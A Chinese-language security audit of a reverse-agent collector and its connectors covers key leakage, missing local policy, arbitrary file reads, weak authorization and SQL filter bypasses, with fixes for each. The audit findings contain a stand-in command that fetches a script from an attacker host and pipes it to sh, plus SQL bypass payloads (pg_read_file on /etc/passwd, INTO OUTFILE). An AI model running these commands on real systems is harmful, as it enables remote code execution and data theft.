# 采集器与连接器 体检

## 现状设计

采集器是装在客户网络内的反向 Agent：`collector/run.py` 用 `X-Collector-Key` 头轮询 `GET /collector/config` 拿到该系统的完整描述符（`backend/app/services/collectors/service.py:58-69`），在**本地**用 `shared/connectors/` 的连接器探活，再 `POST /collector/report` 回报（`run.py:55-76`）；同时 `collector/ws_client.py:420-449` 以 `wss://…/ws/collector?key=<明文密钥>` 建立常驻 WebSocket，平台通过 `ConnectionManager`（`backend/app/services/realtime/websocket.py:15-27`）按 `collector_id` 下发命令并等 `asyncio.Future` 回包，超时 30s。命令面包括只读日志/探活、Prometheus 查询、白名单 Redis/Kafka、`run_readonly_query` 单条 SELECT，以及只在审批工作流里可达的 `restart_container`/`restart_systemd`（`backend/app/api/collector_exec.py:35-36`）。值得注意的一点：下发给采集器的描述符是**解密后**的（`backend/app/services/descriptors/builder.py:26-52`，`service_to_descriptor` 把 `decrypted_config` 平铺进描述符），也就是说 DB 密码、`identity_file` 路径、`readonly_database.database_url` 都由平台经这条通道下推到客户机器；采集器因此既是指挥通道也是凭据分发通道，而平台侧几乎没有任何连接器本地策略——所有"只读"约束都由平台单方面保证。

## 做得好的地方

- **反向出站的架构取舍是对的**：采集器只发起出站连接，平台不需要入站访问客户内网，也不需要客户在防火墙上开口子（`collector/run.py:3-23`、`collector/README.md:1-12`、`collector/ws_client.py:460-465`）。这符合云原生 agentless 采集的标准形态，方向上没问题。
- **密钥只存哈希、明文只出现一次**：`generate_collector_key()` 用 `secrets.token_urlsafe(32)`（256 bit），库里只存 `sha256`（`backend/app/core/security.py:126-131`、`backend/app/models/collectors.py:16`）；下载采集包时必须重新手抄明文密钥，服务端做哈希比对（`backend/app/services/collectors/service.py:127-128`），明文永不可再取回。
- **只读策略单点化，且修过历史分叉**：Redis/Kafka 白名单集中在 `shared/ops_policy.py`，文件头明确记录了"三处各一份、语义跑偏、`CONFIG SET maxmemory` 能绕过"的历史问题与统一决策（`shared/ops_policy.py:1-14`），采集器直接复用同一实现（`collector/ws_client.py:41`）。`shared/container_state.py:1-14` 也是同一个思路。
- **写动作有"注册目标必须完全匹配"这一层**：`restart_container` 会拿请求里的容器名与描述符里注册的 `runtime.container` 逐字比对，不一致直接拒绝（`collector/ws_client.py:197-205`）；systemd 同理（`collector/ws_client.py:230-238`）。这挡住了"平台侧被诱导重启任意容器"的大部分路径。
- **归档/文件类命令做了路径与体积收敛**：`_archive_dir` 先 `realpath` + `startswith(base + os.sep)` 防穿越，再要求 tcatId 含 ≥6 位数字（`collector/ws_client.py:300-313`），读取上限 256KB、取回上限 5MB（`collector/ws_client.py:374`、`:406`）。
- **"执行状态未知"被显式建模而不是当成成功**：命令发送失败或 30s 超时时调用 `mark_current_execution_unconfirmed()`（`backend/app/services/realtime/websocket.py:53-66`），让上层记住"可能已经在客户内网生效了"。这是很多同类平台缺失的一环。
- **跨线程调用事件循环的处理有注释、有防护**：`send_command_sync` + `_require_active_loop`（`backend/app/services/realtime/websocket.py:68-89`），并在调用点写清"用 `asyncio.run` 会新建临时循环导致回包唤不醒"（`backend/app/services/monitoring/metrics.py:107-109`）。
- **采集器上报按启用服务名过滤**：`record_collector_report` 只接受 `enabled` 服务的上报项（`backend/app/services/collectors/service.py:76-81`），被攻陷的采集器无法凭空注入服务。
- **每个外部调用都有显式超时**：`shared/connectors/docker_logs.py:15`、`ssh.py:35`、`tcp.py:20`、`http.py:20`、`prometheus.py:24`、`collector/ws_client.py:88/187/212`，没有裸阻塞调用。

## 发现

### [high] 采集器密钥走 URL query，被 uvicorn 访问日志明文落盘，且永久有效、无轮换

- **证据**：`collector/ws_client.py:425` `url = f"{ws_url}?key={collector_key}"`；`backend/app/api/websocket.py:26` `key: str = Query(..., description="X-Collector-Key（采集器密钥明文）")`。uvicorn 默认 `access_log=True`（`backend/.venv/.../uvicorn/config.py:198`），WebSocket 握手成功时会用 `get_path_with_query_string(self.scope)` 打日志（`backend/.venv/.../uvicorn/protocols/websockets/websockets_impl.py:265`），而部署命令没有关闭访问日志（`deploy/docker-compose.yml:41` `uvicorn app.main:app --host 0.0.0.0 --port 8000`）。同一把密钥还被写进下发脚本的明文（`backend/app/services/collectors/service.py:154-175`），且 `Collector` 模型只有 `token_hash/last_seen/created_at`，没有 `expires_at`/`rotated_at`（`backend/app/models/collectors.py:10-19`）。对比：上行 HTTP 通道用的是请求头（`collector/run.py:51-52`），只有 WS 走了 query。
- **风险**：任何能读到平台 stdout/journald/日志聚合（含镜像、ELK、运维同学的本机 `docker logs`）或反向代理访问日志的人，都拿到了一把长期有效、可跨租户精确认领某个客户系统的 Bearer 凭据。拿它直连 `/ws/collector` 就能：接收该客户系统的全部下行命令与结果（包括 SQL 返回、日志原文），并以该采集器身份下发 `run_readonly_query`/`restart_*`；`manager.connect` 只是覆盖 `_conns[collector_id]`（`backend/app/services/realtime/websocket.py:21-24`），不会踢掉合法采集器，所以窃取者可与真采集器"共线"，且客户侧完全无感。密钥无过期、无轮换、无使用告警，泄露后只能靠删除采集器止损。
- **业界做法**：长生命周期凭据禁止出现在 URL/query（会被 access log、Referer、WAF、APM 全链路留痕）；WS 握手阶段用 `Authorization`/自定义头或一次性短期 token（先 `POST /collector/token` 用密钥换 5-15 分钟的 WS ticket，握手后即失效）；凭据强制轮换 + 上次使用时间/来源 IP 审计（Vault、AWS STS、Datadog Agent 的 `api_key` + 按 host 的 enrollment token 都是"enroll 一次换长期身份"）。日志侧用 `--no-access-log` 或对 `key` 参数脱敏。
- **可采纳性**：moderate。改动集中在"客户端握手方式 + 服务端取凭据方式 + 日志脱敏"三处，但 `websockets` 客户端传头的 API 在 v10-13（`extra_headers`）与 v14+（`additional_headers`）名字不同，而 `collector/requirements.txt:2` 写的是不限上限的 `websockets>=10.0`，必须一并锁版本，否则客户现场老版本采集器会连不上。
- **建议**：（1）`backend/app/api/websocket.py` 改为从 `websocket.headers` 读 `X-Collector-Key`（保留 query 分支但打 deprecation 日志），同时 `collector/ws_client.py:429` 传 header 而非 query；（2）给 `Collector` 加 `one_time_key`/`key_expires_at`，握手前先换票；（3）`deploy/docker-compose.yml:41` 加 `--no-access-log` 或引入日志过滤；（4）`Collector` 增加 `last_used_at/last_used_ip` 并在控制台可视化。预期收益：把"日志泄露 = 客户内网失守"降级为"日志泄露 = 无事发生"。

### [high] 采集器对平台完全信任：描述符里的 health_cmd / log_path 直达 shell，平台被攻陷即客户内网任意命令执行

- **证据**：`collector/ws_client.py:44-273` 的 `_handle_command` 没有任何本地策略层，`health_check` 直接调用连接器（`:66-77`）；`shared/connectors/ssh.py:47-51` 把描述符里的 `health_cmd` 原样交给远端 shell 执行（`subprocess.run(self._base_cmd() + [remote_cmd])`）；更关键的是描述符**每条命令前都会重新从平台拉一次**：`collector/run.py:89-95` 的 `_get_descriptor()` 调 `fetch_config()`，而 `ws_client.py:443` 在每次执行命令时调用它。也就是说命令内容不在采集器本地，而在平台数据库里（`backend/app/models/systems.py:27-37` 的 `Service.connector`/`Service.config`）。
- **风险**：客户安全评审真正会问的问题是"这个 Agent 在我不在的时候能做什么"，而成品答案是"平台让它做什么就做什么"。只要平台侧出现任一写入口——被攻陷的应用进程、SQL 注入/越权 API、被提示注入的 LLM 诊断 Agent（它有服务配置工具链）、或一个内部人员——就可以给某个已连接的远程系统塞一条 `config.health_cmd = "curl -s attacker/shell.sh | sh"`，等采集器下次 `health_check`（`run.py:137-142` 每 30s 一轮 + 任意 Agent 触发）时，在**客户内网以 SSH 用户身份**执行任意命令。爆炸半径是"该平台所有已连接采集器覆盖的全部客户主机"，而客户唯一的防线是出站网络策略，采集器本身零拦截。`shared/connectors/local.py:142-158` 的 `restart_process`/`pkill -f` 说明这类"写能力"在共享 SDK 里已经有先例。
- **业界做法**：Agent 侧必须有自己的策略引擎，且策略来自客户本地的、可审计的配置文件，而不是服务端下发的可执行字符串：Osquery 用本地 SQL/`flags` 文件 + 签名 packs；Wazuh 的 `ossec.conf` 允许客户本地覆盖并限制 `active-response`；Datadog/Falcon 的远端命令需要客户侧开白名单或经过本地审批，且写动作默认关闭；k8s 侧"控制面签名、节点验签"（NodeRestriction、service account token bound object）也是同一思路。工程上通常落成：per-collector 密钥对下行命令做 HMAC/签名封装 + 命令种类与目标资源本地白名单 + `health_cmd` 这类自由文本字段在客户侧必须先注册（或干脆取消）。
- **可采纳性**：moderate。协议层要加签名字段、采集器要加一个本地策略文件（`collector/policy.json`）与验签逻辑，属于"设计补齐"而非重写；难点不在代码，而在要让既有客户的包平滑升级（旧采集器必须能拒绝新字段并用 safe default）。
- **建议**：（1）`collector/ws_client.py` 增加 `_authorize(cmd, args, descriptor)`：命令种类白名单 + `service` 必须在描述符内 + `health_cmd`/`log_path` 只从**本地** `policy.json`（或本地注册的服务指纹）读取，禁止随下发描述符变更；（2）`shared/connectors/ssh.py` 去掉任意 `health_cmd` 通道，改为枚举型 `health_type`（systemd_unit/process/tcp/http）；（3）平台侧对 `Service.config` 的修改写审计（见下一条）并加二次确认。预期收益：把"平台失守"与"客户内网沦陷"解耦，这是这类产品能否过客户安全评审的关键。

### [high] connector 类型未校验 + 未知类型静默回退 LocalConnector，配合绝对路径 log_file 构成采集器主机任意文件读取

- **证据**：`shared/connectors/__init__.py:26-29` `cls = _REGISTRY.get(kind, LocalConnector)` —— 未知/拼错的 connector 一律落到跑在**采集器本机**的 `LocalConnector`。平台侧对 `connector` 字段没有任何取值校验：`backend/app/schemas/systems.py:18` `connector: str = "http"`，落库路径 `backend/app/services/systems/lifecycle.py:55` 直接 `connector=body.connector`，没有 enum/白名单。而 `LocalConnector._log_file()` 用 `_abspath(service.get('log_file') or f'logs/{name}.log')`，`_abspath` 对绝对路径原样返回（`shared/connectors/local.py:17-20`、`:55-56`），`read_logs` 执行 `subprocess.run(['tail', '-n', str(lines), lf])`（`local.py:120-124`），`search_logs` 同理会 grep 任意文件（`local.py:131-138`）。远程系统的描述符同样是解密后平铺下发的（`backend/app/services/descriptors/builder.py:26-52`），所以 `config.log_file` 会原样到达采集器。
- **风险**：只要有一个 operator（或任何能改服务配置的路径）给**远程**系统建了 `connector: "local"`、或把 `ssh` 打成 `"SSH"`/`"docker"`/`"k8s "`，采集器就会用本机语义执行：`fetch_logs` 变成"tail 采集器主机上的任意可读文件"，`/etc/shadow`、`~/.ssh/id_rsa`、`/etc/aiops-collector/run_collector.sh`（里面正好有明文密钥）都能被拉回平台并原样展示给调用方。这里最要命的是**不需要攻击者**——一个前端下拉框没覆盖到的取值、一次手写 API 调用、一次 connector 改名，就会让"读客户内网日志"静默变成"读采集器主机任意文件"，而且没有任何日志、没有任何拦截。反向的可用性问题同样成立：本该 ssh 探活的远程服务被当成 local，探活结果永远是错的（`is_running()` 去 kill 本机 pid）。
- **业界做法**：连接器注册表必须 fail-closed——未知 kind 直接报 `unknown connector` 并让服务进入 `probe_status=invalid`，绝不允许隐式回退到"权限更高/语义更宽"的实现；路径类字段一律以显式根目录（`log_root`）为基准做 `realpath` 收敛，禁止绝对路径与 `..`（Kubernetes 的 `hostPath` 校验、Filebeat 的 `paths` + `harvesters` 白名单、Falco 的 `allowed_file_paths` 都是这个模式）；平台侧 `connector` 用 `Literal[...]`/enum 校验。
- **可采纳性**：easy。三处小改：枚举校验、registry fail-closed、路径收敛；不需要架构改动，且可以立刻加上"记录一条 audit + 拒绝"。唯一要注意的是兼容存量脏数据（先扫描库里非法的 `connector` 取值）。
- **建议**：（1）`shared/connectors/__init__.py:26-29` 改为 `cls = _REGISTRY.get(kind)`，为 None 时抛错并在探活结果里返回 `unsupported connector`；（2）`backend/app/schemas/systems.py:18` 换成 `Literal` 并把未知值在 API 层 422；（3）`shared/connectors/local.py:55-56` 增加 `log_root` 收敛（默认白名单 `logs/`），非本地系统拒绝 `connector=local`（平台侧下发描述符时过滤）。预期收益：消灭一条"配置错误即越权读取"的暗道，同时修掉远程服务被错探的隐性故障。

### [high] /systems/{id}/collector/exec 只校验登录，只读账号即可在客户生产库执行任意 SELECT、KEYS *、拉日志，且无审计

- **证据**：`backend/app/api/collector_exec.py:28-38` 的依赖只有 `org_id: int = Depends(get_current_org_id)`（`:33`），没有 `require_operator`；对比同目录 `backend/app/api/collectors.py:23/43/56` 创建/删除/下载采集包都要求 `require_operator`（`backend/app/core/deps.py:31-37`），重启则要求审批（`collector_exec.py:35-36`）。而 `ALLOWED_COLLECTOR_COMMANDS`（`backend/app/services/collectors/exec.py:14-17`）里放行的是 `run_readonly_query`（在**对方网络**任意 SELECT，`collector/ws_client.py:123-145`）、`run_redis_command`（`ops_policy.py:19-22` 把 `KEYS` 列入只读动词）、`fetch_logs`/`search_logs`（客户生产日志原文）。另一条入口 `GET /systems/{id}/logs` 同样只用 `get_current_org_id`（`backend/app/api/health.py:109`）。同时全套 `record_audit_event`（`backend/app/services/audit.py:9-38`）在 collector exec / 日志读取路径上**一次都没调用**——审计目前只覆盖 workflow、OpenAPI 告警、诊断取消等（`grep -rn 'event_type=' backend/app`）。
- **风险**：平台自身的角色模型是分层的（`owner`/`operator`，重启还要 `restart_policy.authorized_user_ids` 名单，`backend/app/services/systems/restart.py:24-34`），但最接近客户数据的那条通道反而只要求"已登录 + 属于本 org"。任何 viewer 账号（或一次泄露的普通用户 JWT）都能：跑 `SELECT * FROM users`、`SELECT pg_read_file('/etc/passwd')`（见下一条）把客户生产库内容导出；用 `KEYS *` 把 Redis 全量键名拿走；把含密钥/个人信息的生产日志拉回来。事后**没有任何审计记录**能回答"谁在什么时候读了哪张表"，这既是安全事件也是合规硬伤（等保/SOC2 都要求数据访问留痕）。
- **业界做法**：数据面与管理面共用一套 RBAC，且"能读生产数据"本身就是一等权限（Grafana 的 `datasource query` 权限、AWS 的 `rds-db:connect` + IAM 条件、Datadog 的 `logs_read_data` 独立于 `dashboards_read`）；多租户 SaaS 对"代客执行查询"一律要求显式授权对象 + 全程审计（actor、system、SQL、行数、耗时）+ 可选的双人复核。`KEYS` 应直接在白名单里换成 `SCAN`（Redis 官方明确 `KEYS` 是 O(N) 阻塞命令）。
- **可采纳性**：easy。加一个依赖、加一次审计调用即可立刻收口；细粒度 RBAC（数据读取独立权限位）是后续演进。
- **建议**：（1）`backend/app/api/collector_exec.py:33` 与 `backend/app/api/health.py:109` 的读数据类命令改用 `require_operator`（或新增 `require_data_reader`），`fetch_logs` 可保留 viewer 但要求审计；（2）在 `backend/app/services/collectors/exec.py:53` 前后调用 `record_audit_event(event_type="collector.exec" / "collector.data_read", actor_id=user_id, input={"cmd":..., "args":...}, output={"rows": n})`；（3）`shared/ops_policy.py:19` 删除 `KEYS`、只留 `SCAN`。预期收益：非法数据读取从"无人知晓"变成"有据可查、默认拒绝"。

### [medium] 采集器重连时旧连接的 finally 会注销新连接，被误判为「离线」

- **证据**：`backend/app/services/realtime/websocket.py:21-24` `connect()` 直接 `self._conns[collector_id] = ws`，不关闭也不标记旧 socket；`backend/app/api/websocket.py:50-51` 在**任何**连接退出的 `finally` 里执行 `manager.disconnect(collector_id)`，而 `disconnect` 是无条件 `pop`（`realtime/websocket.py:26-27`）。
- **风险**：网络抖动/TCP 半开时，服务端旧协程可能还没发现对端已死；采集器按 `ping_interval=30, ping_timeout=10`（`collector/ws_client.py:429`）判定超时后重连并写入新的 `_conns[id]`；随后旧协程从 `receive_json()` 抛错退出，`finally` 把**新连接**从表里删掉。结果：采集器明明连着，平台侧 `is_connected()` 为假，`_require_connected` 直接抛 503「采集器当前离线」（`services/collectors/exec.py:62-64`），所有下行命令、远程回查（`services/workflows/execution.py:74-75`）、远程指标（`services/monitoring/metrics.py:99-100`）全部失败，直到采集器下一次重连周期才可能自愈——而这期间实时诊断/一键重启都是不可用的假故障。协议层还有第二个隐患：旧 socket 没被关闭，两条连接可能同时存在。
- **业界做法**：连接表按"连接实例"而非"实体 ID"管理，退出时做 compare-and-swap（`if self._conns.get(id) is ws: pop`），新连接建立时主动以 close code（如 4002 "replaced"）踢掉旧连接并记录；心跳/租约（lease）超时后由服务端驱动清理，不依赖对端 finally。
- **可采纳性**：easy。改 `connect`/`disconnect` 两个方法即可，风险极低，且可加一条"重复连接被替换"的日志用于观察。
- **建议**：`backend/app/services/realtime/websocket.py:21-27` 改为 `async def connect` 中先 `old = self._conns.get(id)`，`await old.close(code=4002, reason="replaced")` 再赋值；`def disconnect(self, collector_id, ws)` 只在 `self._conns.get(collector_id) is ws` 时 pop；`backend/app/api/websocket.py:51` 传入当前 `websocket`。预期收益：消除远程系统"假离线"这一类难查的间歇性故障。

### [medium] run_readonly_query 靠正则黑名单，可绕过（INTO OUTFILE / pg_read_file），且无只读事务与语句超时

- **证据**：过滤逻辑是"必须以 select 开头 + 不含分号 + 不匹配关键字黑名单"（`collector/ws_client.py:31-34` 的 `_DANGEROUS_SQL`、`:125`），黑名单只覆盖 `insert|update|delete|drop|alter|truncate|create|replace|grant|revoke|vacuum|attach|detach|copy`；执行处 `create_engine(url, connect_args=_database_connect_args(url, database))`，而 `_database_connect_args` 只对 sqlite 生效（`:283-286`），结束才 `connection.rollback()`（`:141`）。`SELECT ... INTO OUTFILE '/path'`（MySQL 写文件）、`SELECT pg_read_file('/etc/passwd')`（PG 读服务端任意文件）、`SELECT ... FROM t FOR UPDATE`（行锁）都能通过过滤。
- **风险**：`ro_readonly` 账号若带 `FILE`/`pg_read_server_files`/超级用户角色，"只读"立刻变成"在客户 DB 主机上写文件/读任意文件"，是典型的黑名单绕过→RCE 路径。即使权限不足，`SELECT pg_sleep(3600)` 或一条大表全扫也会在**没有语句超时**的情况下把连接挂住，而采集器的命令循环是串行的（见下一条），最终表现为"采集器在线但什么都不响应"。
- **业界做法**：不靠正则判断 SQL 意图——用真正的只读连接（专用只读账号 + `SET SESSION TRANSACTION READ ONLY` / `SET default_transaction_read_only=on`），叠加语句级超时（`statement_timeout` / `max_execution_time` / `MAX_EXECUTION_TIME` hint），再叠加 SQL 解析器白名单（sqlglot/pglast 判断 AST 只有单条 SELECT、无 INTO/DML/函数黑名单）与结果行数上限。
- **可采纳性**：moderate。读-only 事务与超时按方言差异（MySQL/PG 语法不同）需要分支处理，SQL 解析器还要新增依赖（`collector/requirements.txt`），但收益与成本比很高。
- **建议**：`collector/ws_client.py:131-143` 中在 `engine.connect()` 后按方言执行 `SET SESSION TRANSACTION READ ONLY` 与超时设置；把 `_DANGEROUS_SQL` 换成 sqlglot 解析 + 关键字/函数黑名单（补 `into`, `outfile`, `dumpfile`, `for update`, `pg_read_file`, `lo_import`）；给 `create_engine` 加 `pool_pre_ping` 与 `connect_args`/`execution_options` 超时。预期收益：把"只读"从文案变成 DB 层可强制的事实。

### [medium] 下行命令单线程串行执行，无 deadline/取消/幂等；平台 30s 超时后命令仍在内网继续跑

- **证据**：`collector/ws_client.py:432-444` 在 `async for raw in ws` 里**同步**调用 `_handle_command(...)` 后才 `await ws.send(...)`，没有 worker/队列/并发；`_handle_command` 内部最长路径有 `timeout=30`（`run_kafka_command`，`:187`）、`restart_systemd` 的 `timeout=30`（`:248`）、而 `run_readonly_query` **完全没有超时**。平台侧 `send_command(timeout=30.0)`（`backend/app/services/realtime/websocket.py:38`）超时后只调 `mark_current_execution_unconfirmed()`，不发送任何取消，`_pending` 里删掉 future 了事（`:63`）；`ALLOWED_COLLECTOR_COMMANDS` 也没有幂等键概念（`services/collectors/exec.py:14-17`）。
- **风险**：（1）队头阻塞——一条慢 SQL 或一个卡住的 `docker exec` 会让采集器在几十秒到无限期内不处理任何后续命令，平台侧表现为大面积超时，Agent 会把"采集器坏了"写进诊断结论，误判根因；（2）超时竞态——`run_kafka_command`/`restart_*` 的 30s 与平台 30s 完全相等，命令大概率在平台宣告失败之后才真正完成，重启型动作尤其危险（平台说失败、实际已重启）；（3）无幂等键，调用方重试就会重复执行（例如重复 `CONFIG SET`/重复重启），而采集器不做去重；（4）采集器重启会丢掉所有在途请求，平台侧只能等超时。
- **业界做法**：每条命令起独立 task 并由有界并发池执行（`asyncio.to_thread` + `Semaphore`），请求里带 `deadline` 与 `idempotency_key`，超时主动取消；服务端与客户端共享同一条 deadline（客户端剩余时间 = 平台超时 - 已耗时），客户端对重复 `idempotency_key` 直接返回缓存结果；有副作用命令走"两阶段：先受理后查询状态"。控制面工具（Kubernetes 的 `--request-timeout`、Terraform 的 operation id、Stripe 的 Idempotency-Key）都是这个模式。
- **可采纳性**：moderate。协议要新增 `deadline`/`idempotency_key` 字段并保证向后兼容（老采集器忽略新字段），采集器要从 `async for` 改成 task + 有界并发 + 结果去重表，属于结构性改动但可在采集器内部先落地。
- **建议**：`collector/ws_client.py:432-444` 改为 `asyncio.create_task` + `Semaphore(2)` 并把 `request_id` 作为幂等键（保留最近 N 条结果）；给 `run_readonly_query` 加 15s 上限；把 `run_kafka_command`/`restart_*` 的子进程超时压到平台超时的 60-70%（如 20s），让"平台超时"总是发生在"命令已结束"之后。预期收益：消除误判、避免重复重启、让超时语义可解释。

### [medium] 断线期间探测结果直接丢弃、无本地缓冲回补；密钥失效的采集器会永久无限重连

- **证据**：`collector/run.py:79-86` `run_once` 先 `fetch_config()` 再 `probe()` 再 `report()`，任何一步抛异常都由 `:137-142` 的循环 `except` 吞掉并 `time.sleep(INTERVAL)`——`fetch_config` 失败时连探活都不会做，`report` 失败时已经拿到的结果被直接丢弃，采集器本地没有任何落盘队列。平台侧 `record_collector_report` 只更新 `last_seen`/`last_health`（`backend/app/services/collectors/service.py:85-92`），没有缺口/序列号概念；`list_collectors` 仅按 `interval_seconds * 2` 判在线（`service.py:44-53`）。另一个方向：密钥被删/失效时服务端在 `accept()` 之前 `close(code=4001)`（`backend/app/api/websocket.py:34-36`），uvicorn 记为 403（`websockets_impl.py:280-292`），采集器把它当普通异常处理，退避封顶 60s 后**永远重试**（`ws_client.py:446-449`）。另外退避没有抖动：所有采集器同一节奏，平台重启会撞出重连峰。
- **风险**：平台升级/网络割接/客户防火墙抖动期间的健康历史会出现空洞，且平台无法区分"采集器没数据"和"服务全挂"（`last_health` 停留在旧值，`backend/app/services/monitoring/health.py:16-29` 只能靠陈旧度给"采集器长时间未上报"）。被删除或密钥轮换掉的采集器会持续每 60s 敲一次平台、每次打一条 403 日志，永久占用连接与日志噪声，运维无法从日志判断"这是废弃节点还是攻击探测"。无抖动重连在平台重启时会造成瞬时连接风暴。
- **业界做法**：采集端本地有界 spool（磁盘环形缓冲）+ 断点续传与序列号/时间窗口标记，恢复后回补并显式标注数据缺口（Prometheus remote-write WAL、Filebeat spool+registry、Fluent Bit filesystem buffer 都是标配）；认证失败属于**不可重试**错误，应打印明确指引并进入休眠/停止，而不是无限退避；退避必须加抖动（full jitter）并区分错误类型（网络 vs 4xx）。
- **可接受/采纳性**：moderate。本地 spool 需要设计容量上限、加密（其中含客户日志片段）与回补幂等语义；认证失败停止重试是 easy 的一小步，可以先做。
- **建议**：`collector/run.py:137-142` 增加"上报失败入本地队列（有界、上限 N 条/几 MB），成功后按序回补"；`collector/ws_client.py:446-449` 区分 403/401（打印"密钥无效或已被删除，请重新下载采集包"并停止重试或降到低频告警）与网络异常，退避加 `random.uniform(0, delay)` 抖动；平台侧 `record_collector_report` 增加上报序号，缺口时在健康面板显式标注"数据缺口"。预期收益：监控历史可信、可自愈，且废弃采集器不再制造噪声。

### [medium] SSH 连接器 accept-new 无 known_hosts 固定，重启依赖 NOPASSWD sudo

- **证据**：`shared/connectors/ssh.py:19-20` `['ssh', '-o', 'BatchMode=yes', '-o', 'ConnectTimeout=8', '-o', 'StrictHostKeyChecking=accept-new']`，没有 `-o UserKnownHostsFile=...`，也没有主机密钥指纹校验或固定；`read_logs`/`search_logs` 通过 `tail -n {int(lines)} {path}`（`:66`、`:74`）在远端执行，`restart_systemd` 用 `sudo -n systemctl restart`（`:83-85`）；私钥不进描述符，只保留 `identity_file` 路径（`:23-24`），这一点是好的。
- **风险**：`accept-new` 的信任模型是"首次见到即接受"（TOFU），首次连接或 known_hosts 尚未写入时，同网段的中间人可以把平台的探活结果与日志读取重定向/伪造——采集器把攻击者提供的文本当作"客户生产日志"回传，形成数据投毒（会直接污染 LLM 诊断结论与告警）。`identity_file` 由平台下发的路径决定（描述符平铺），意味着任何能改服务配置的人可以让 ssh 用采集器主机上**任意**可读私钥去连（配合下一条的写入口就是横向移动）。`sudo -n` 要求采集器运行用户有 NOPASSWD 规则，现场往往被放宽成 `NOPASSWD: ALL`，这把"只读探活"升级成"采集器进程即 root 执行器"。
- **业界做法**：主机密钥预置与 pinning（下发带指纹的 known_hosts 片段、或使用 SSH CA 签发的 host certificate + `@cert-authority`），禁用 TOFU；`IdentityFile` 限制在专用目录并只读；sudoers 精确到"允许的 unit 列表 + 指定用户"（`Cmnd_Alias AIOPS_UNITS = /bin/systemctl restart app.service, ...`），而不是 NOPASSWD:ALL；特权动作可考虑改走 systemd 的 dbus/polkit 授权。Ansible/Terraform 的 ssh provider、Teleport 都是"预置信任 + 最小 sudo 面"的做法。
- **可采纳性**：easy。pinning 与文档化 sudoers 模板是低成本改动，采集包生成脚本已经在下发文件（`backend/app/services/collectors/service.py:188-210`），可以顺手塞一份 `known_hosts`。
- **建议**：`shared/connectors/ssh.py:19-20` 改为 `StrictHostKeyChecking=yes` + 可配置 `UserKnownHostsFile`（默认采集器目录下的 known_hosts），并在 `collector/README.md` 给出最小 sudoers 片段；`identity_file` 收敛到采集器专用目录（拒绝目录外路径）。预期收益：堵住 TOFU 数据投毒，并给客户一个能写进安全评审的过审证据。

### [medium] 不强制 TLS：PLATFORM_URL 由 request.base_url 推导，明文 http/ws 也能上线

- **证据**：`collector/run.py:39` `PLATFORM_URL = os.getenv("PLATFORM_URL", "http://localhost:8000")`，`:42` 允许 `ws://`；`collector/ws_client.py:460-465` 只做字符串替换 `https://→wss://`、`http://→ws://`，不校验也不会拒绝明文。地址来源是控制台下载采集包时用的请求 scheme：`backend/app/api/collectors.py:65` `str(request.base_url)` 直接写进 `run_collector.sh/.bat/.ps1`（`backend/app/services/collectors/service.py:151-175`）。反向代理侧 `Caddyfile:1` 是裸 `:80 {`，没有 TLS 指令（TLS 只在实际部署里由 cloudflared 隧道提供，见 `Caddyfile:2` 的注释），而 README 却把 `wss://`/HTTPS 描述为既定事实（`collector/README.md:7-11`、`:44`）。全仓没有任何 `verify=`/TLS 相关开关，因此 `requests` 与 `websockets` 的默认校验是开着的（这点没问题），问题在于**是否用 TLS 完全没有约束**。

- **业界做法**：客户端对控制面地址 fail-closed——非 https/wss 直接拒绝启动，除非显式开发开关（如 `COLLECTOR_ALLOW_INSECURE=1`）；多租户 SaaS 用平台配置的对外域名而不是 `request.base_url` 生成脚本（避免 Host/scheme 被外部输入影响），并配 HSTS；可选地做证书 pinning（自签场景）或 mTLS（合规场景）。Datadog/Sentry/Grafana Agent 都只接受 https 端点。
- **可采纳性**：easy。两处校验 + 一处配置项即可（`request.base_url` 换 `settings.public_base_url`），不影响存量已部署的采集器（只影响新下载的包与新增启动校验，明文场景给显式豁免开关即可平滑）。
- **建议**：（1）`collector/run.py:39-42` 增加 scheme 校验：非 `https` 时若非 `COLLECTOR_ALLOW_INSECURE=1` 则打印明确错误并退出；（2）`backend/app/api/collectors.py:65` 改用已有的 `settings.public_base_url`（`backend/app/core/config.py:175-179`，目前只用于附件下载链接，默认值 `http://localhost`，需要同时补上"生产必须显式配置且为 https"的校验，否则会下发更糟的 `http://localhost`）；（3）在 `Caddyfile`/部署文档里明确 TLS 终止点，README 注明"平台地址必须是 https"。预期收益：默认安全，避免"测试配置带上生产"。

### [low] 分发链硬化不足：容器以 root 运行、依赖完全不锁版本、基础镜像浮动 tag

- **证据**：`collector/Dockerfile:1` `FROM python:3.12-slim`（无 digest）、`:1-19` 全程无 `USER`（默认 root）、无 `--require-hashes`、无健康检查；`collector/requirements.txt:1-5` 五个依赖中只有 `websockets>=10.0` 有下界，`requests`/`SQLAlchemy`/`pymysql`/`psycopg2-binary` 完全无约束；`collector.spec:51` 的 pyinstaller 分发产物也没有签名/校验步骤；`collector/README.md:30-37` 给的 `docker run` 没有 `--read-only`/`--cap-drop`，且未挂 `docker.sock`——意味着容器化部署下 `docker logs`/`docker restart`/`run_kafka_command` 的 `docker exec`（`collector/ws_client.py:186`、`shared/connectors/docker_logs.py:11`）实际会失败，而这没有任何文档提示；反过来若为了让它工作挂上 `docker.sock`，采集器就等于客户宿主机 root，`read-only` 边界名存实亡。
- **风险**：客户内网以 root 运行、且依赖版本每次重装都可能变化的 Agent，是供应链攻击的高价值目标（`psycopg2-binary` 自带 libpq，安全更新滞后于系统 libpq，官方文档本身就建议生产环境用源码版）。升级不可复现（同一份包在不同时间装出不同依赖），出故障时无法回滚到确定版本；`docker.sock` 的两种极端（不挂就用不了、挂了就等同宿主 root）没有在文档里讲清，客户会自己踩坑并留下一个比预期大得多的权限面。
- **业界做法**：Agent 容器以非 root + 只读 rootfs + `--cap-drop=ALL` 运行，需要访问 docker 时用一个只暴露 `/var/run/docker.sock` 只读接口的 sidecar（tecnativa/docker-socket-proxy）或改用 cAdvisor/journald 采集日志；依赖用 lock + hash 固定（uv/pip-tools + `--require-hashes`），镜像按 digest 固定并做漏洞扫描（Trivy/Grype）+ 制品签名（cosign/SLSA）；发布流程产出 SBOM。
- **可采纳性**：easy。改动都是配置/CI 层面，不需要改业务逻辑；成本主要是维护 lock 文件与重建镜像的流程开销。
- **建议**：`collector/Dockerfile` 增加 `USER 10001`、按 digest 固定基础镜像、`pip install --no-cache-dir --require-hashes -r requirements.txt`；`collector/requirements.txt` 用 lock 固化版本；`collector/README.md:30-37` 补一节"容器化部署的权限模型"（docker 访问用 socket proxy，或明确说明容器模式下容器类命令不可用）。预期收益：可复现升级 + 缩小单点失陷的权限面。

